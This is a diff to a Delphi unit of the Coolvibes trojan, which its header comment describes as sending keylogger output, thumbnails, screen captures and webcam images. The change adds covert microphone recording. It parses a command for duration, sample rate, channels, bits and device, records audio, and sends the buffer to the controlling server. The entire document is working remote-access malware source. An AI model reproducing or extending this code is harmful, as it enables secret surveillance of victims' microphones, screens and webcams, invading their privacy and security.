@@ -1,11 +1,11 @@
-{Unit perteniciente al troyano coolvibes que se encarga de gestionar el envio de captura de pantalla y de webcam}
+{Unit perteniciente al troyano coolvibes que se encarga de gestionar el envio de keylogger, thumbnails,captura de pantalla y de webcam}
 unit UnitThreadsCapCamCapture;
 
 
 interface
 
 
-uses Windows, SysUtils, SocketUnit, UnitVariables, classes, unitCapScreen, unitfunciones, unitCamScreen;
+uses Windows, SysUtils, SocketUnit, UnitVariables, classes, unitCapScreen, unitfunciones, unitCamScreen, UnitAudio;
 
 type
   TThreadCapCam = class(TThread)
@@ -31,7 +31,7 @@ end;
 
 procedure TThreadCapCam.Execute();
 var
-  Tempstr1, Tempstr2, tempstr, tempstr3, recibido: string;
+  Tempstr1, Tempstr2, tempstr, tempstr3, tempstr4, recibido, buffer: string;
   MS : TMemoryStream;
 begin
   FreeOnTerminate := True;
@@ -135,6 +135,41 @@ begin
         CapturaThumb := '';
       end;
 
+    end
+    else
+    if(CapturaAudio<>'') then
+    begin
+      Recibido := Trim(CapturaAudio); //segundos|hz-canales-bits|dispositivo|
+
+      TempStr := copy(recibido, 1, Pos('|', recibido) - 1); //segundos
+      Delete(Recibido, 1, pos('|', Recibido));
+      TempStr1 := Copy(recibido, 1, pos('|', Recibido) - 1); //calidad
+
+      TempStr3 := Copy(TempStr1, 1, pos('-', TempStr1) - 1); //HZ
+      Delete(TempStr1, 1, pos('-', TempStr1));
+      TempStr4 := Copy(TempStr1, 1, pos('-', TempStr1) - 1); //Canales 1|2
+      Delete(TempStr1, 1, pos('-', TempStr1));               //Tempstr1 = bits: 8|16;
+
+      Delete(Recibido, 1, pos('|', Recibido));
+      TempStr2 := Copy(recibido, 1, pos('|', Recibido) - 1); //dispositivo
+      Delete(Recibido, 1, pos('|', Recibido));
+      buffer := '';
+
+      
+      GrabaAudio(strtointdef(tempstr2,0){Dispositivo},
+                 strtointdef(tempstr,1){Duracion en segundos},
+                 strtointdef(tempstr3,11025),
+                 strtointdef(tempstr1,8){bits},
+                 strtointdef(tempstr4,1){mono|stereo},
+                 buffer{buffer});
+      if server.Connected then
+      begin
+        server.SendString('SH|'+SH + #10); //nos identificamos
+        server.SendString('GETAUDIO|'+inttostr(length(buffer))+'|'+#10);
+        server.SendString(buffer);
+      end;
+      TempStr := '';
+      CapturaAudio := '';
     end;
 
   end;
